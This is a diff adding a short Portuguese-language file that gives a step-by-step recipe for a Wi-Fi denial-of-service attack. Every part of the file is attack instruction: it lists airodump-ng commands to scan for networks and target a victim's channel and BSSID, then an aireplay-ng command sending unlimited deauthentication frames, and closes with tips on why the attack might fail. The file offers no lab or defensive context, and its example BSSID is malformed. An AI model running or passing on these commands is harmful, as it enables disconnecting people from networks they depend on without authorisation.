@@ -1,0 +1,20 @@
+ATAQUE DE NEGAÇÃO DE SERVIÇO EM REDES WIFI.
+		1.ESCANEAR AS REDES:
+		 airodump-ng nome_da_interface
+	 
+	2.SELECIONAR A REDE:
+		airodump-ng -c canal_da_vitima --bssid bssid_alvo nome_da_interface
+		
+		EX: airodump-ng -c 8 --bssid 29AC:35GC:2810:AS23 wlan0mon
+		
+	3.ABRIR OUTRO TERMINAL E EXECUTAR O CODIGO:
+		aireplay-ng --deauth 0 -a bssid_alvo nome_da_interface
+		
+		CASO RECEBA A MENSAGEM'[0|0 ACKs] SIGNIFICA QUE O ATAQUE NÃO FOI CONCRETIZADO.
+		POSSÍVEIS MOTIVOS: 
+		
+			PROCESSOS ATIVOS INTERROMPENDO O ATAQUE.
+			
+			STA OU AP FORA DO SEU ALCANCE.
+			
+			A SUA PLACA WIRELESS NÃO REALIZA ATAQUES DEAUTH.
